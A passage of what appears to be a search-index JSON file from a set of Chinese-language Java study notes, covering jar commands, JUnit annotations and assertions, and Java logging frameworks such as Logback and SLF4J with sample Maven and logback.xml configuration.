-cvf helloworld.jar abc/xyz/helloworld.class\n\njar -cvfm helloworld.jar META-INF/MANIFEST.MF  abc/xyz/helloworld.class\n\n# 2. \u67e5\u770bjar\u5305\u7684\u6587\u4ef6\u7ed3\u6784\njar -tf helloworld.jar\n</code></pre>"},{"location":"language/java/junit/","title":"JUnit","text":""},{"location":"language/java/junit/#_1","title":"\u5355\u5143\u6d4b\u8bd5","text":"<p>\u4ec0\u4e48\u662f\u5355\u5143\u6d4b\u8bd5\uff1f</p> <ul> <li>\u5355\u5143\u6d4b\u8bd5\u662f\u9488\u5bf9\u6700\u5c0f\u529f\u80fd\u5355\u5143\u7f16\u5199\u6d4b\u8bd5\u4ee3\u7801</li> <li>Java \u7a0b\u5e8f\u7684\u6700\u5c0f\u529f\u80fd\u5355\u5143\u662f\u65b9\u6cd5</li> <li>\u56e0\u6b64\uff0c\u5355\u5143\u6d4b\u8bd5\u5c31\u662f\u9488\u5bf9\u5355\u4e2a Java \u65b9\u6cd5\u7684\u6d4b\u8bd5</li> </ul> <p>JUnit \u662f java \u7f16\u7a0b\u8bed\u8a00\u7406\u60f3\u7684\u5355\u5143\u6d4b\u8bd5\u6846\u67b6\u3002</p>"},{"location":"language/java/junit/#junit_1","title":"JUnit \u7684\u8bbe\u8ba1","text":"<ul> <li>TestCase\uff1a\u8868\u793a\u4e00\u4e2a\u6d4b\u8bd5</li> <li>TestSuite\uff1a\u8868\u793a\u4e00\u7ec4 TestCase\uff0c\u5373\u4e00\u7ec4\u6d4b\u8bd5</li> <li>TestFixture\uff1a\u8868\u793a\u4e00\u4e2a\u6d4b\u8bd5\u73af\u5883</li> <li>TestResult\uff1a\u7528\u4e8e\u6536\u96c6\u6d4b\u8bd5\u7ed3\u679c</li> <li>TestRunner\uff1a\u7528\u4e8e\u8fd0\u884c\u6d4b\u8bd5</li> <li>TestListener\uff1a\u7528\u4e8e\u76d1\u542c\u6d4b\u8bd5\u8fc7\u7a0b\uff0c\u6536\u96c6\u6d4b\u8bd5\u6570\u636e</li> <li>Assert\uff1a\u7528\u4e8e\u65ad\u8a00\u6d4b\u8bd5\u7ed3\u679c\u662f\u5426\u6b63\u786e</li> </ul>"},{"location":"language/java/junit/#_2","title":"\u6ce8\u89e3","text":"<p>Table 1. Annotations</p> JUnit 4 / JUnit 5 Description @Test Identifies a method as a test method. @Test(timeout=100) Fails if the method takes longer than 100 milliseconds. @Test (expected = Exception.class) Fails if the method does not throw the named exception. @Ignore\u00a0or\u00a0@Ignore(\"Why disabled\") Marks that the test should be disabled.This is useful when the underlying code has been changed and the test case has not yet been adapted.Or if the execution time of this test is too long to be included. It is best practice to provide the optional description, why the test is disabled. @AfterClass / @AfterAll Executed once, after all tests have been finished. It is used to perform clean-up activities, for example, to disconnect from a database. Methods annotated with this annotation need to be defined as\u00a0static\u00a0to work with JUnit. @BeforeClass / @BeforeAll Executed once, before the start of all tests. It is used to perform time intensive activities, for example, to connect to a database. Methods marked with this annotation need to be defined as\u00a0static\u00a0to work with JUnit. @After / @AfterEach Executed after each test. It is used to cleanup the test environment (e.g., delete temporary data, restore defaults). It can also save memory by cleaning up expensive memory structures. @Before / @BeforeEach Executed before each test. It is used to prepare the test environment (e.g., read input data, initialize the class). <p>JUnit \u6267\u884c\u903b\u8f91\uff1a</p> <pre><code>invokeBeforeClass(StudentTest.class); // @BeforeClass\nfor (Method testMethod : findTestMethods(StudentTest.class)){\n        StudentTest test = new StudentTest();\n        test.setUp(); //@Before\n        testMethod.invoke(test); //@Test\n        test.tearDown(); //@After\n}\ninvokeAfterClass(StudentTest.class); // @AfterClass\n</code></pre>"},{"location":"language/java/junit/#_3","title":"\u65ad\u8a00","text":"<p>JUnit \u901a\u8fc7 Assert \u7c7b\u63d0\u4f9b\u9759\u6001\u65b9\u6cd5\u6765\u6d4b\u8bd5\u67d0\u4e9b\u6761\u4ef6\u3002\u8fd9\u4e9b\u65ad\u8a00\u8bed\u53e5\u901a\u5e38\u4ee5 assert \u5f00\u5934\u3002</p> <p>\u5b83\u4eec\u5141\u8bb8\u60a8\u6307\u5b9a\u9519\u8bef\u6d88\u606f\u3001\u9884\u671f\u7ed3\u679c\u548c\u5b9e\u9645\u7ed3\u679c\u3002\u65ad\u8a00\u65b9\u6cd5\u5c06\u6d4b\u8bd5\u8fd4\u56de\u7684\u5b9e\u9645\u503c\u4e0e\u9884\u671f\u503c\u8fdb\u884c\u6bd4\u8f83\u3002</p> <p>Table 2. Methods to assert test results</p> Statement Description fail([message]) Let the method fail. Might be used to check that a certain part of the code is not reached or to have a failing test before the test code is implemented. The message parameter is optional. assertTrue([message,] boolean condition) Checks that the boolean condition is true. assertNotSame([message,] expected, actual) Checks that both variables refer to different objects. assertSame([message,] expected, actual) Checks that both variables refer to the same object. assertNotNull([message,] object) Checks that the object is not null. assertNull([message,] object) Checks that the object is null. assertEquals([message,] expected, actual, tolerance) Test that float or double values match. The tolerance is the number of decimals which must be the same. assertEquals([message,] expected, actual) Tests that two values are the same. Note: for arrays the reference is checked not the content of the arrays. assertFalse([message,] boolean condition) Checks that the boolean condition is false."},{"location":"language/java/junit/#_4","title":"\u5b9e\u8df5","text":""},{"location":"language/java/junit/#maven","title":"Maven","text":"<pre><code>&lt;dependencies&gt;\n    &lt;dependency&gt;\n        &lt;groupId&gt;junit&lt;/groupId&gt;\n        &lt;artifactId&gt;junit&lt;/artifactId&gt;\n        &lt;version&gt;4.12&lt;/version&gt;\n    &lt;/dependency&gt;\n&lt;/dependencies&gt;\n</code></pre>"},{"location":"language/java/junit/#idea","title":"IDEA","text":"<p>\u8fdb\u5165\u9700\u8981\u751f\u6210\u6d4b\u8bd5\u7c7b\u7684\u6587\u4ef6\uff0c\u70b9\u51fb\u6587\u4ef6\u4efb\u610f\u5904\uff0c\u6309\u4e0b\u5feb\u6377\u952e\uff1a</p> <ul> <li><code>command N</code></li> <li><code>control return</code></li> </ul> <p>\u9009\u62e9 <code>generate Test...</code> \uff0c\u8fdb\u5165\u5982\u4e0b\u754c\u9762\uff1a</p> <p></p> <p>\u9009\u62e9\u9700\u8981\u6d4b\u8bd5\u7684\u65b9\u6cd5\uff0c\u4f1a\u81ea\u52a8\u5728 <code>/src/test/java</code> \u76ee\u5f55\u4e0b\u751f\u6210\u6d4b\u8bd5\u7c7b\u3002</p> <p>\u5982\u679c\u9009\u62e9 <code>setUp</code> \u548c <code>tearDown</code> \uff0c\u4f1a\u81ea\u52a8\u751f\u6210\u4e24\u4e2a\u65b9\u6cd5\uff0c\u6ce8\u89e3\u8be6\u60c5\u770b\u4e0a\u65b9\u3002</p>"},{"location":"language/java/junit/#vscode","title":"VSCode","text":"<p>\u6587\u4ef6\u5185\uff0c\u53f3\u952e \u2192 \u6e90\u4ee3\u7801\u64cd\u4f5c</p> <p>\u53ef\u4ee5\u81ea\u5b9a\u4e49\u5feb\u6377\u952e\uff0c\u8bbe\u7f6e\u4e3a\uff1a<code>control return</code></p>"},{"location":"language/java/junit/#reference","title":"Reference","text":"<ul> <li>Unit Testing with JUnit 4 - Tutorial</li> </ul>"},{"location":"language/java/log/","title":"Log","text":""},{"location":"language/java/log/#_1","title":"\u6846\u67b6\u4ecb\u7ecd","text":"<p>java \u9886\u57df\u5b58\u5728\u591a\u79cd\u65e5\u5fd7\u6846\u67b6\uff0c\u76ee\u524d\u5e38\u7528\u7684\u65e5\u5fd7\u6846\u67b6\u5982\u4e0b\uff1a</p>"},{"location":"language/java/log/#_2","title":"\u8bb0\u5f55\u578b\u65e5\u5fd7\u6846\u67b6(\u65e5\u5fd7\u5b9e\u73b0\uff09","text":""},{"location":"language/java/log/#log4jlog4j2","title":"Log4j\u3001Log4j2","text":"<p>\u914d\u7f6e\u6587\u4ef6\u540d\u79f0\u53ca\u5176\u5b58\u653e\u4f4d\u7f6e</p> <ul> <li>Log4j\uff1a<code>log4j.properties</code></li> <li>Log4j2\uff1a<code>log4j2.properties</code>\u3001<code>log4j2.xml</code>\u3001<code>log4j2.json</code>\u3001<code>log4j2.yaml</code></li> <li>\u6587\u4ef6\u4f4d\u7f6e\uff1a\u6dfb\u52a0\u5230 classpath \u4e2d\uff0c\u82e5\u4e3a maven \u9879\u76ee\uff0c\u5219\u5b58\u653e\u81f3 <code>/src/main/resources</code></li> </ul> log4j2 Maven \u4f9d\u8d56<pre><code>&lt;dependencies&gt;&lt;/dependencies&gt;\n  &lt;dependency&gt;\n    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n    &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;\n    &lt;version&gt;2.15.0&lt;/version&gt;\n  &lt;/dependency&gt;\n  &lt;dependency&gt;\n    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;\n    &lt;version&gt;2.15.0&lt;/version&gt;\n  &lt;/dependency&gt;\n&lt;/dependencies&gt;\n</code></pre> <p>\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u5355\u72ec\u4f7f\u7528\uff0c\u4e0d\u8fc7\u63a8\u8350\u901a\u8fc7\u95e8\u9762\u65e5\u5fd7\u6846\u67b6\u8c03\u7528\uff01\u6545\u800c\u5728\u6b64\u5148\u4e0d\u4ecb\u7ecd\uff01</p>"},{"location":"language/java/log/#juljava-util-logging","title":"Jul(Java Util Logging)","text":"<p>jul \u65e0\u9700\u4f9d\u8d56\u5373\u53ef\u8c03\u7528\uff0c\u56e0\u6b64\u5982\u679c\u662f\u5199\u5c0f\u6587\u4ef6\u7684\u8bdd\u53ef\u4ee5\u7528\u7528\u8fd9\u4e2a\uff0c\u5199\u9879\u76ee\u4e0d\u5efa\u8bae\u4f7f\u7528\u3002</p> <p>\u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\u4f4d\u7f6e\uff1a<code>$JAVA_HOME/jre/lib/logging.properties</code></p> Jul Usage<pre><code>import java.util.logging.Logger;\nLogger logger = Logger.getGlobal();\nlogger.info(\"log\")\n</code></pre>"},{"location":"language/java/log/#logback","title":"Logback","text":"<p>\u914d\u7f6e\u6587\u4ef6\u540d\u79f0\u53ca\u5176\u5b58\u653e\u4f4d\u7f6e</p> <p>\u4f9d\u6b21\u5728classpath\u4e2d\u5bfb\u627e\uff1alogback-test.xml \u2192 logback.groovy \u2192 logback.xml</p> <p>\u5c06\u914d\u7f6e\u6587\u4ef6\u00a0logback.xml\u00a0\u548c\u00a0logback-test.xml\u00a0\u6309\u7167\u4ee5\u4e0b\u5c42\u6b21\u7ed3\u6784\u6dfb\u52a0\u5230\u9879\u76ee\u4e2d\uff1a</p> \u9879\u76ee\u7ed3\u6784\u793a\u610f<pre><code>src\n\u251c\u2500\u2500 main\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 resources\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 logback.xml\n\u2514\u2500\u2500 test\n    \u2514\u2500\u2500 resources\n        \u2514\u2500\u2500 logback-test.xml\n</code></pre> logback Maven \u4f9d\u8d56<pre><code>&lt;!-- https://mvnrepository.com/artifact/ch.qos.logback/logback-classic --&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;\n    &lt;artifactId&gt;logback-classic&lt;/artifactId&gt;\n    &lt;version&gt;1.2.3&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre> <p>Note</p> <p>\u5bfc\u5165\u4e0a\u8ff0\u4f9d\u8d56\u540e\uff0c\u4f1a\u81ea\u52a8\u5bfc\u5165\u5982\u4e0b\u4e09\u4e2a\u4f9d\u8d56\uff1a</p> <ul> <li>logback-classic</li> <li>logback-core\uff08\u7531\u4e8e\u4f1a\u81ea\u52a8\u5bfc\u5165\uff0c\u56e0\u6b64\u65e0\u9700\u6211\u4eec\u81ea\u5df1\u518d\u624b\u52a8\u5bfc\u5165\u8be5\u4f9d\u8d56\u4e86</li> <li>slf4j-api(\u8be5\u4f9d\u8d56\u4e00\u822c\u81ea\u5df1\u5bfc\u5165\uff0c\u56e0\u6b64\u65e0\u9700\u7ba1\u4ed6\uff09</li> </ul>"},{"location":"language/java/log/#_3","title":"\u95e8\u9762\u578b\u65e5\u5fd7\u6846\u67b6(\u65e5\u5fd7\u63a5\u53e3)","text":""},{"location":"language/java/log/#jcljakarta-commans-logging","title":"JCL(Jakarta Commans Logging)","text":"JCL Maven \u4f9d\u8d56<pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;commons-logging&lt;/groupId&gt;\n    &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;\n    &lt;version&gt;1.2&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre> JCL Usage<pre><code>import org.apache.commons.logging.Log;\nimport org.apache.commons.logging.LogFactory;\n\n// 1. \u5982\u679c\u5728\u9759\u6001\u65b9\u6cd5\u4e2d\u5f15\u7528Log\uff0c\u901a\u5e38\u76f4\u63a5\u5b9a\u4e49\u4e00\u4e2a\u9759\u6001\u7c7b\u578b\u53d8\u91cf\npublic class Test {\n    static final Log log = LogFactory.getLog(Test.class);\n\n    static void staticFunc() {\n        log.info(\"static function\");\n    }\n}\n\n// 2. \u5982\u679c\u5728\u5b9e\u4f8b\u65b9\u6cd5\u4e2d\u5f15\u7528Log\uff0c\u901a\u5e38\u5b9a\u4e49\u4e00\u4e2a\u5b9e\u4f8b\u53d8\u91cf\npublic class Test {\n        // \u53ef\u88ab\u5b50\u7c7b\u7ee7\u627f\n    protected final Log log = LogFactory.getLog(getClass());\n\n    void func() {\n        log.info(\"function\");\n    }\n}\n</code></pre>"},{"location":"language/java/log/#slf4j","title":"SLF4J","text":"SLF4J Maven \u4f9d\u8d56<pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;org.slf4j&lt;/groupId&gt;\n    &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt;\n    &lt;version&gt;1.7.30&lt;/version&gt;\n&lt;/dependency&gt;\n\n&lt;!-- \u7b80\u5355\u5b9e\u73b0\u7684\u6865\u63a5\u5668\uff0c\u65e0\u9700\u914d\u7f6e\u5373\u53ef\u8f93\u51fa(https://mvnrepository.com/artifact/org.slf4j/slf4j-simple) --&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.slf4j&lt;/groupId&gt;\n    &lt;artifactId&gt;slf4j-simple&lt;/artifactId&gt;\n    &lt;version&gt;1.7.30&lt;/version&gt;\n&lt;/dependency&gt;\n\n&lt;!-- \u6865\u63a5Java Util Logging(https://mvnrepository.com/artifact/org.slf4j/slf4j-jdk14) --&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.slf4j&lt;/groupId&gt;\n    &lt;artifactId&gt;slf4j-jdk14&lt;/artifactId&gt;\n    &lt;version&gt;1.7.30&lt;/version&gt;\n    &lt;scope&gt;test&lt;/scope&gt;\n&lt;/dependency&gt;\n\n&lt;!-- \u6865\u63a5log4j 1.2\u7248\u672c(https://mvnrepository.com/artifact/log4j/log4j) --&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.slf4j&lt;/groupId&gt;\n    &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt;\n    &lt;version&gt;1.7.30&lt;/version&gt;\n&lt;/dependency&gt;\n\n&lt;!-- \u6865\u63a5log4j2 (https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-slf4j-impl)  --&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n    &lt;artifactId&gt;log4j-slf4j-impl&lt;/artifactId&gt;\n    &lt;version&gt;2.15.0&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre> SLF4J Usage<pre><code>import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nfinal Logger logger = LoggerFactory.getLogger(o.class);\n\n//\u7279\u6b8a\u7528\u6cd5,\u53ef\u4ee5\u76f4\u63a5\u7528\u62ec\u53f7\u5360\u4f4d\u7b26\u66ff\u4ee3\u503c\nint age=18;\nString name=\"happytsing\";\nlogger.info(\"name{} age{}\",name,age);\n</code></pre>"},{"location":"language/java/log/#_4","title":"\u914d\u7f6e\u6587\u4ef6\u8be6\u89e3","text":""},{"location":"language/java/log/#log4j2todo","title":"Log4j2\uff08TODO\uff09","text":"<p>TODO\uff01</p>"},{"location":"language/java/log/#logback_1","title":"logback","text":""},{"location":"language/java/log/#_5","title":"\u6839\u8282\u70b9 <p>\u5305\u542b\u4e0b\u9762\u4e09\u4e2a\u5c5e\u6027\uff1a</p> <ul> <li>scan: \u5f53\u6b64\u5c5e\u6027\u8bbe\u7f6e\u4e3a true \u65f6\uff0c\u914d\u7f6e\u6587\u4ef6\u5982\u679c\u53d1\u751f\u6539\u53d8\uff0c\u5c06\u4f1a\u88ab\u91cd\u65b0\u52a0\u8f7d\uff0c\u9ed8\u8ba4\u503c\u4e3a true\u3002</li> <li>scanPeriod: \u8bbe\u7f6e\u76d1\u6d4b\u914d\u7f6e\u6587\u4ef6\u662f\u5426\u6709\u4fee\u6539\u7684\u65f6\u95f4\u95f4\u9694\uff0c\u5982\u679c\u6ca1\u6709\u7ed9\u51fa\u65f6\u95f4\u5355\u4f4d\uff0c\u9ed8\u8ba4\u5355\u4f4d\u662f\u6beb\u79d2\u3002\u5f53 scan \u4e3a true \u65f6\uff0c\u6b64\u5c5e\u6027\u751f\u6548\u3002\u9ed8\u8ba4\u7684\u65f6\u95f4\u95f4\u9694\u4e3a 1 \u5206\u949f\u3002</li> <li>debug: \u5f53\u6b64\u5c5e\u6027\u8bbe\u7f6e\u4e3a true \u65f6\uff0c\u5c06\u6253\u5370\u51fa logback \u5185\u90e8\u65e5\u5fd7\u4fe1\u606f\uff0c\u5b9e\u65f6\u67e5\u770b logback \u8fd0\u884c\u72b6\u6001\u3002\u9ed8\u8ba4\u503c\u4e3a false\u3002</li> </ul>","text":""},{"location":"language/java/log/#_6","title":"\u5b50\u8282\u70b9 <p>\u5305\u542b\u4e0b\u9762\u4e24\u4e2a\u5c5e\u6027\uff1a</p> <ul> <li>name\uff1a\u53d8\u91cf\u540d</li> <li>value\uff1a\u53d8\u91cf\u503c</li> </ul> <p>\u5b9a\u4e49\u53d8\u91cf\uff0c\u901a\u8fc7\u5b9a\u4e49\u7684\u53d8\u91cf\u4f1a\u88ab\u63d2\u5165\u5230 logger \u4e0a\u4e0b\u6587\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u201c${}\u201d\u6765\u4f7f\u7528\u53d8\u91cf\u3002","text":""},{"location":"language/java/log/#_7","title":"\u5b50\u8282\u70b9 <p>\u76ee\u7684\u5730\uff0c\u662f\u8d1f\u8d23\u5199\u65e5\u5fd7\u7684\u7ec4\u4ef6\uff0c\u5373\u65e5\u5fd7\u7684\u8f93\u51fa\u76ee\u6807\u3002</p> <p>\u5305\u542b\u4e24\u4e2a\u5fc5\u8981\u5c5e\u6027\uff1a</p> <ul> <li>name\uff1aappender \u7684 name\uff0c\u968f\u610f\u53d6</li> <li>class\uff1aappender \u7684\u5168\u9650\u5b9a\u540d<ul> <li><code>ch.qos.logback.core.ConsoleAppender</code></li> <li><code>ch.qos.logback.core.FileAppender</code></li> <li><code>ch.qos.logback.core.rolling.RollingFileAppender</code></li> </ul> </li> </ul> <p>\u4e00\u3001ConsoleAppender</p> <p>\u628a\u65e5\u5fd7\u8f93\u51fa\u5230\u63a7\u5236\u53f0\uff0c\u6709\u4ee5\u4e0b\u5b50\u8282\u70b9\uff1a</p> <ul> <li>&lt;encoder&gt;\uff1a\u5bf9\u65e5\u5fd7\u8fdb\u884c\u683c\u5f0f\u5316</li> <li>&lt;target&gt;\uff1a\u5b57\u7b26\u4e32 System.out(default)\u6216\u8005 System.err\uff0c\u4e00\u822c\u65e0\u9700\u8c03\u6574</li> </ul> <p>\u4e8c\u3001FileAppender</p> <p>\u628a\u65e5\u5fd7\u8f93\u51fa\u5230\u6587\u4ef6\uff0c\u6709\u4ee5\u4e0b\u5b50\u8282\u70b9\uff1a</p> <ul> <li>&lt;encoder&gt;</li> <li>&lt;file&gt;\uff1a\u88ab\u5199\u5165\u7684\u6587\u4ef6\u540d\uff0c\u53ef\u4ee5\u662f\u76f8\u5bf9\u76ee\u5f55\uff0c\u4e5f\u53ef\u4ee5\u662f\u7edd\u5bf9\u76ee\u5f55</li> <li>&lt;append&gt;\uff1a</li> <li>true(default)\uff1a\u65e5\u5fd7\u88ab\u6dfb\u52a0\u5230\u6587\u4ef6\u7ed3\u5c3e</li> <li>false\uff1a\u6e05\u7a7a\u73b0\u5b58\u6587\u4ef6</li> <li>&lt;prudent&gt;\uff1a\u5b89\u5168\u5199\u5165\uff0c\u9ed8\u8ba4\u4e3a false\uff0c\u4e00\u822c\u65e0\u9700\u8c03\u6574</li> </ul> <p>\u4e09\u3001RollingFileAppender</p> <p>\u6eda\u52a8\u8bb0\u5f55\u6587\u4ef6\uff0c\u5148\u5c06\u65e5\u5fd7\u8bb0\u5f55\u5230\u6307\u5b9a\u6587\u4ef6\uff0c\u5f53\u7b26\u5408\u67d0\u6761\u4ef6\u65f6\uff0c\u5c06\u65e5\u5fd7\u8bb0\u5f55\u5230\u5176\u4ed6\u6587\u4ef6\uff0c\u5b50\u8282\u70b9\uff1a</p> <ul> <li>&lt;encoder&gt;</li> <li>&lt;file&gt;</li> <li>&lt;append&gt;</li> <li> <p>&lt;rollingPolicy&gt;\uff1a\u53d1\u751f\u6eda\u52a8\u65f6\uff0c\u51b3\u5b9a RollingFileAppender \u7684\u884c\u4e3a\uff0c\u8bbe\u8ba1\u6587\u4ef6\u79fb\u52a8\u548c\u91cd\u547d\u540d\uff0c\u5176\u6709\u5c5e\u6027 class\uff0c\u5b9a\u4e49\u5177\u4f53\u7684\u6eda\u52a8\u7b56\u7565\u7c7b\uff1a</p> <ul> <li><code>&lt;rollingPolicy class=\"ch.qos.logback.core.rolling.TimeBasedRollingPolicy\"&gt;</code></li> <li><code>&lt;rollingPolicy class=\"ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy\"&gt;</code></li> </ul> </li> </ul>  <p>Warning</p> <p>\u672a\u5b8c\u6210\uff0c\u53c2\u89c1</p>","text":""},{"location":"language/java/log/#_8","title":"\u5b50\u8282\u70b9 <p>\u7528\u4e8e\u8bbe\u7f6e\u67d0\u4e00\u4e2a\u5305\u6216\u5177\u4f53\u7684\u67d0\u4e00\u4e2a\u7c7b\u7684\uff1a</p> <ul> <li>\u65e5\u5fd7\u6253\u5370\u7ea7\u522b</li> <li>\u6307\u5b9a Appender</li> </ul> <p>\u6709\u5982\u4e0b\u5c5e\u6027\uff1a</p> <ul> <li>name\uff1a\u6307\u5b9a\u7684\u5305/\u7c7b</li> <li>level\uff1a\u65e5\u5fd7\u7ea7\u522b(\u5927\u5c0f\u5199\u65e0\u5173)\uff0cALL\u3001OFF\u3001TRACE\u3001DEBUG(default)\u3001INFO\u3001WARN\u3001ERROR</li> <li>additivity\uff1a\u662f\u5426\u5411\u4e0a\u7ea7 logger \u4f20\u9012\u6253\u5370\u4fe1\u606f\uff0ctrue/false(default)</li> </ul> <p>\u6709\u5982\u4e0b\u6807\u7b7e\uff1a</p> <ul> <li>&lt;appender-ref ref=\"appender_name\"</li> </ul> <pre><code>&lt;logger name=\"org.hibernate.SQL\" level=\"debug\" additivity=\"false\"&gt;\n  &lt;appender-ref ref=\"appender_name\"&gt;\n&lt;/logger&gt;\n\n&lt;logger name=\"org.hibernate\" level=\"debug\" additivity=\"true\"&gt;\n  &lt;appender-ref ref=\"appender_name1\"&gt;\n  &lt;appender-ref ref=\"appender_name2\"&gt;\n&lt;/logger&gt;\n</code></pre> <p>\u5982\u4e0a\u4f8b\uff0c <code>name=\"org.hibernate\"</code> \u662f <code>name=\"org.hibernate.SQL\"</code> \u7684\u4e0a\u7ea7\uff0c\u4f46\u662f\u7531\u4e8e <code>additivity=\"false\"</code> \uff0c\u56e0\u6b64\u4e0d\u4f1a\u4e0a\u4f20\u5230\u4e0a\u7ea7 <code>name=\"org.hibernate\"</code> ,\u66f4\u4f20\u4e0d\u5230 <code>root logger</code> \uff0c\u56e0\u6b64\u4ec5\u4ec5\u6267\u884c\u8be5 logger \u8bbe\u7f6e\u7684 appender\u3002</p> <p>\u9664\u4e86 <code>org.hibernate.SQL</code> \u8fd9\u4e2a\u7c7b\u4e4b\u5916\u7684 <code>org.hibernate</code> \u4e2d\u7684\u5176\u4ed6\u6240\u6709\u7c7b\uff0c\u90fd\u4f1a\u8fd0\u884c logger <code>name=\"org.hibernate\"</code> \uff0c\u53c8\u7531\u4e8e\u5b83\u8bbe\u7f6e\u4e86 <code>additivity=\"true\"</code> \uff0c\u56e0\u6b64\u5728\u6267\u884c\u4e86\u8be5 logger \u8bbe\u7f6e\u7684 appender \u4e4b\u540e\uff0c\u8fd8\u4f1a\u4e0a\u4f20\u5230 <code>root logger</code> \uff0c\u518d\u6b21\u6267\u884c <code>root logger</code> \u4e2d\u8bbe\u7f6e\u7684 appender\u3002</p>","text":""},{"location":"language/java/log/#_9","title":"\u5b50\u8282\u70b9 <p>\u672c\u8d28\u4e0a\u4e5f\u662f\u4e00\u4e2a\u5143\u7d20\uff0c\u7279\u6b8a\u70b9\u4e3a\u5b83\u662f\u6839 logger\uff0c\u662f\u6240\u6709\u7684\u4e0a\u7ea7\uff0c\u56e0\u6b64\u5b83\u6ca1\u6709 additivity \u5c5e\u6027\uff08\u6ca1\u6709\u4e0a\u7ea7\u53ef\u4ee5\u4f20\u9012\uff09\u3002 <pre><code>&lt;root level=\"DEBUG\"&gt;\n  &lt;appender-ref ref=\"appender_name\"&gt;\n&lt;/root&gt;\n</code></pre>","text":""},{"location":"language/java/log/#logbackxml","title":"logback.xml <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;configuration scan=\"true\" scanPeriod=\"60 seconds\" debug=\"false\"&gt;\n\n    &lt;!--\u5b9a\u4e49\u65e5\u5fd7\u6587\u4ef6\u7684\u5b58\u50a8\u5730\u5740 \u52ff\u5728 LogBack \u7684\u914d\u7f6e\u4e2d\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84--&gt;\n    &lt;property name=\"LOG_HOME\" value=\"logback/\" /&gt;\n\n    &lt;!--\u63a7\u5236\u53f0\u65e5\u5fd7\uff0c \u63a7\u5236\u53f0\u8f93\u51fa --&gt;\n    &lt;appender name=\"STDOUT\" class=\"ch.qos.logback.core.ConsoleAppender\"&gt;\n        &lt;encoder class=\"ch.qos.logback.classic.encoder.PatternLayoutEncoder\"&gt;\n            &lt;!--\u683c\u5f0f\u5316\u8f93\u51fa\uff1a%d\u8868\u793a\u65e5\u671f\uff0c%thread\u8868\u793a\u7ebf\u7a0b\u540d\uff0c%-5level\uff1a\u7ea7\u522b\u4ece\u5de6\u663e\u793a5\u4e2a\u5b57\u7b26\u5bbd\u5ea6,%msg\uff1a\u65e5\u5fd7\u6d88\u606f\uff0c%n\u662f\u6362\u884c\u7b26--&gt;\n            &lt;pattern&gt;%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{50} - %msg%n&lt;/pattern&gt;\n        &lt;/encoder&gt;\n    &lt;/appender&gt;\n\n    &lt;appender name=\"FILE\" class=\"ch.qos.logback.core.FileAppender\"&gt;\n        &lt;file&gt;${LOG_HOME}/output.log&lt;/file&gt;\n        &lt;append&gt;true&lt;/append&gt;\n        &lt;encoder&gt;\n            &lt;pattern&gt;%-4relative [%thread] %-5level %logger{35} - %msg%n&lt;/pattern&gt;\n        &lt;/encoder&gt;\n    &lt;/appender&gt;\n\n    &lt;logger name=\"aa.bb.cc\" level=\"INFO\" additivity=\"false\"&gt;\n        &lt;appender-ref ref=\"STDOUT\" /&gt;\n    &lt;/logger&gt;\n    &lt;logger name=\"org.appache\" level=\"OFF\"/&gt;\n\n    &lt;!-- \u65e5\u5fd7\u8f93\u51fa\u7ea7\u522b --&gt;\n    &lt;root level=\"DEBUG\"&gt;\n        &lt;appender-ref ref=\"FILE\"/&gt;\n        &lt;appender-ref ref=\"STDOUT\" /&gt;\n    &lt;/root&gt;\n\n&lt;/configuration&gt;\n</code></pre>","text":""},{"location":"language/java/log/#_10","title":"\u5b9e\u8df5","text":"<p>\u963f\u91cc\u5f00\u53d1\u624b\u518c</p> <p>\u5e94\u7528\u4e2d\u4e0d\u53ef\u76f4\u63a5\u4f7f\u7528\u65e5\u5fd7\u7cfb\u7edf\uff08log4j\u3001logback\uff09\u4e2d\u7684 API \uff0c\u800c\u5e94\u4f9d\u8d56\u4f7f\u7528\u65e5\u5fd7\u6846\u67b6 SLF4J \u4e2d\u7684 API \u3002</p> <p>\u4f7f\u7528\u95e8\u9762\u6a21\u5f0f\u7684\u65e5\u5fd7\u6846\u67b6\uff0c\u6709\u5229\u4e8e\u7ef4\u62a4\u548c\u5404\u4e2a\u7c7b\u7684\u65e5\u5fd7\u5904\u7406\u65b9\u5f0f\u7684\u7edf\u4e00\u3002</p> <p>\u56e0\u6b64\u9879\u76ee\u4e2d\u63a8\u8350\u91c7\u7528\uff1alogback+SLF4J \u7684\u7ec4\u5408\u3002</p>"},{"location":"language/java/log/#reference","title":"Reference","text":"<ul> <li>\u5ed6\u96ea\u5cf0 | Java Log</li> <li>\u6398\u91d1 | \u6df1\u5165\u638c\u63e1 Java \u65e5\u5fd7\u4f53\u7cfb \u2b50\ufe0f</li> <li>CSDN | slf4j \u4e0e log4j\u3001log4j2</li> <li>Logback | configuration</li> <li>\u535a\u5ba2\u56ed | LogBack \u914d\u7f6e\u6587\u4ef6 logback.xml \u8be6\u89e3</li> <li>CSDN | LogBack logger \u4e0e root \u7684\u5173\u7cfb\u89e3\u91ca</li> </ul>"},{"location":"language/java/maven/","title":"Maven 